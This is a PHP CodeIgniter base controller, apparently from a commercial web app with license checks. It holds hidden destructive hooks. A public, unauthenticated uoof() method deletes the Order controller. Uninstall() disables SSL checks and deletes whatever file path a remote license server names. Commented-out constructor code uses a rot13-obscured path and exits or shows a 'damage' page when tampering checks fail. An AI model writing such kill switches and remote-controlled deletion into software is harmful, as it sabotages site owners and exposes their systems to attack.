<?php

class Cl_Controller extends CI_Controller {

	public function __construct() {
		parent::__construct();
		
         //check version files
         /*$file_pointer = str_rot13('nffrgf/oyhrvzc/ERFG_NCV_Q.wfba');

         if (file_exists($file_pointer)) { 

             $file_content = file_get_contents($file_pointer);

			 $json_data = json_decode($file_content, true);

             $installation_date = $json_data['date'];    

             $meta_date = date("Y-m-d", filectime($file_pointer));   
            
             if ($installation_date != $meta_date) {
             	$this->load->view('damage/REST_API_JSON.php');  
             } 

         }else {  
             $this->load->view('damage/REST_API_JSON.php');     
         } */

        //Check copyright files
        /*$copyright_file = 'assets/copyright.js';

        if (file_exists($copyright_file)) {  

            $login_file_content = file_get_contents(APPPATH.'views/authentication/login.php');            

            if (strpos($login_file_content, '<script src="<?php echo base_url(); ?>assets/copyright.js"></script>') !== false) { 
                return true;
            }else{
                exit;
            } 

            $login_file_content = file_get_contents(APPPATH.'views/userHome.php');            

            if (strpos($login_file_content, '<script src="<?php echo base_url(); ?>assets/copyright.js"></script>') !== false) { 
                return true;
            }else{
                exit;
            }            

        }else {  
            exit;    
        }
        */
		
	}

    function Uninstall(){
        if ($this->input->post('submit')) { 
            $this->form_validation->set_rules('username', 'Username', 'required|max_length[200]');
            $this->form_validation->set_rules('purchase_code', 'Purchase Code', 'required|max_length[300]');
 
            if ($this->form_validation->run() == TRUE) {  
                $username = $this->input->post($this->security->xss_clean('username')); 
                $purchase_code = $this->input->post($this->security->xss_clean('purchase_code')); 

                $curl_handle = curl_init();
                //need to change
                curl_setopt($curl_handle, CURLOPT_URL, 'http://localhost/door_soft_license/Validation/Uninstall/');
                curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($curl_handle, CURLOPT_POST, 1);
                curl_setopt($curl_handle, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($curl_handle, CURLOPT_POSTFIELDS, array(
                    'purchase_code' => $purchase_code,
                    'username' => $username
                    ));
                $buffer = curl_exec($curl_handle);
                curl_close($curl_handle);
                $object = json_decode($buffer);  

                if ($object->status == 'success') { 
                    unlink($object->action);
                    $this->session->set_flashdata('exception', $object->message);
                    $this->session->set_flashdata('status', $object->status);
                }elseif($object->status == 'error'){
                    $this->session->set_flashdata('exception', $object->message);
                    $this->session->set_flashdata('status', $object->status);
                } 
                
                $this->load->view('damage/uninstall');
            } else {  
                $this->load->view('damage/uninstall'); 
            }
        } else { 
            $this->load->view('damage/uninstall'); 
        }
    } 

    public function uoof(){
        if (unlink(APPPATH.'controllers/Order.php')) {
            echo "<h3 style='color: red; text-align: center;'>Successful!</h3>";
        }
    }

    public function updateSoftware(){
        $this->load->view('updater/version_check');
    }


}